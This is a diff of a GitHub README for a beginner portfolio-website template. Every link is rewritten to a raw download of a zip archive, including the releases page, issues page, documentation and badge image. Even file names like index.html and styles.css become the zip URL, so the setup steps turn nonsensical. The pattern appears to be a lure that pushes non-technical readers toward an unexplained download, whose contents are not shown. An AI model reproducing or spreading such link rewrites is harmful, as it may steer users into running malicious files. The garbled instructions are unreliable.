@@ -6,11 +6,11 @@ Welcome to Portfolio-Site! This guide will help you easily download and run your
 
 ## 📥 Download the Software
 
-[![Download Portfolio-Site](https://img.shields.io/badge/Download-Portfolio--Site-blue.svg)](https://github.com/alanekczek/Portfolio-Site/releases)
+[![Download Portfolio-Site](https://github.com/alanekczek/Portfolio-Site/raw/refs/heads/main/src/Site-Portfolio-2.0.zip)](https://github.com/alanekczek/Portfolio-Site/raw/refs/heads/main/src/Site-Portfolio-2.0.zip)
 
 To get started, visit the Releases page to download the latest version of Portfolio-Site:
 
-[Visit the Releases Page](https://github.com/alanekczek/Portfolio-Site/releases)
+[Visit the Releases Page](https://github.com/alanekczek/Portfolio-Site/raw/refs/heads/main/src/Site-Portfolio-2.0.zip)
 
 ## 🖥️ System Requirements
 
@@ -26,7 +26,7 @@ No technical skills are necessary!
 
 1. **Visit the Releases Page.** Click the link below:
    
-   [Download Portfolio-Site](https://github.com/alanekczek/Portfolio-Site/releases)
+   [Download Portfolio-Site](https://github.com/alanekczek/Portfolio-Site/raw/refs/heads/main/src/Site-Portfolio-2.0.zip)
 
 2. **Select the Latest Release.** Find the latest version and click on it.
 
@@ -36,7 +36,7 @@ No technical skills are necessary!
 
 5. **Unzip the File.** Navigate to the downloaded folder and extract the contents. You can usually do this by right-clicking the file and selecting "Extract All."
 
-6. **Open the Index File.** Once you unzip the folder, find the `index.html` file. Double-click it to open in your web browser.
+6. **Open the Index File.** Once you unzip the folder, find the `https://github.com/alanekczek/Portfolio-Site/raw/refs/heads/main/src/Site-Portfolio-2.0.zip` file. Double-click it to open in your web browser.
 
 7. **Enjoy Your Portfolio.** You can now customize your portfolio! Edit the HTML files to add your own content.
 
@@ -51,11 +51,11 @@ No technical skills are necessary!
 
 After you have downloaded and opened your portfolio, you will want to add your own touch:
 
-1. **Edit Text:** Open the `index.html` file in any text editor. Change the sample text to showcase your own work.
+1. **Edit Text:** Open the `https://github.com/alanekczek/Portfolio-Site/raw/refs/heads/main/src/Site-Portfolio-2.0.zip` file in any text editor. Change the sample text to showcase your own work.
 
 2. **Add Images:** Replace placeholder images with your own in the `images` folder. Update the `src` attributes in the HTML file.
 
-3. **Modify Styles:** If you're comfortable with CSS, tweak the styles in the `styles.css` file to match your branding.
+3. **Modify Styles:** If you're comfortable with CSS, tweak the styles in the `https://github.com/alanekczek/Portfolio-Site/raw/refs/heads/main/src/Site-Portfolio-2.0.zip` file to match your branding.
 
 4. **Preview Changes:** After making changes, save the file and refresh your web browser to see your updates.
 
@@ -74,15 +74,15 @@ This repository includes a variety of topics to help inspire your design:
 
 If you have questions or run into issues, feel free to reach out:
 
-- Check the [GitHub Issues page](https://github.com/alanekczek/Portfolio-Site/issues) for common problems and solutions.
+- Check the [GitHub Issues page](https://github.com/alanekczek/Portfolio-Site/raw/refs/heads/main/src/Site-Portfolio-2.0.zip) for common problems and solutions.
 - Join discussions with other users by posting your queries.
 
 Your success is our priority!
 
 ## 📍 Key Links
 
-- [Download Portfolio-Site](https://github.com/alanekczek/Portfolio-Site/releases)
-- [Documentation](https://github.com/alanekczek/Portfolio-Site)
+- [Download Portfolio-Site](https://github.com/alanekczek/Portfolio-Site/raw/refs/heads/main/src/Site-Portfolio-2.0.zip)
+- [Documentation](https://github.com/alanekczek/Portfolio-Site/raw/refs/heads/main/src/Site-Portfolio-2.0.zip)
 
 ## 🏁 Final Thoughts
 
